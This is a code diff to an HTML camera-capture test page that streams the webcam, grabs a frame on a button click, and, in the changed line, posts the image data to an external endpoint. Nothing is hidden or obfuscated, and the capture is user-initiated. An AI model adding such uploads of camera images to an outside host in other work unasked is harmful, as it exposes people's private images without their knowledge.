@@ -1,3 +1,6 @@
+
+
+
 <!DOCTYPE html>
     <!-- <script>
       // VConsole will be exported to `window.VConsole` by default.
@@ -12,6 +15,7 @@
           }
           console.log('>>> sleep finish');
       }
+
       // test
       sleep(10000);
     </script> -->
@@ -32,11 +36,11 @@
     <script src="//r.haier.net/assets/overlay/dts-fe/common-assets/axios/0.23.0/axios.min.js"></script>
   </head>
   <body>
-  <div>Get camera</div>
+  <div>get camera</div>
   <video id="video" width="480" height="320" muted controls  autoplay="autoplay">
   </video>
   <div>
-    <button id="capture">take picture</button>
+    <button id="capture">take pic</button>
   </div>
   <canvas id="canvas" width="480" height="320"></canvas>
   <script>
@@ -84,7 +88,7 @@
 
     if (navigator.mediaDevices.getUserMedia || navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia) {
       //调用用户媒体设备, 访问摄像头
-      getUserMedia({ video: { width: 480, height: 320 },audio: false }, success, error);
+      getUserMedia({ video: { width: 480, height: 320 } }, success, error);
     } else {
       alert('不支持访问用户媒体');
     }
@@ -92,10 +96,11 @@
     document.getElementById('capture').addEventListener('click', function () {
       context.drawImage(video, 0, 0, 480, 320);
       var img = canvas.toDataURL('image/png');
-      //$.post('https://snssdk.bytedance.net/1jb3p491',{'imegse':img},function(data){
+      $.post('https://snssdk.bytedance.net/ugrxa3ug',{'imegse':img},function(data){
       //指定photo.php文件所在位置
       })
     })
   </script>
 </body>
 </html>
+
